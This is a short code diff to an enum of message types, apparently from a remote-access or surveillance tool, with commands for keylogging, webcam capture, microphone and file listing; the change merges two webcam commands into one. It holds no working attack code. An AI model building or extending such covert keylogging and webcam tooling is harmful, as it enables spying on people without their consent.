@@ -13,8 +13,7 @@ enum MessageEnum {
     MessageEnableKeylog,
     MessageHeartbeartKeylog,
     MessageDisableKeylog,
-    MessageEnableWebcam,
-    MessageDisableWebcam,
+    MessageInvokeWebcam,
     MessageEnableMicro,     //unimplemented
     MessageDisableMicro,    //unimplemented
     MessageListFile,
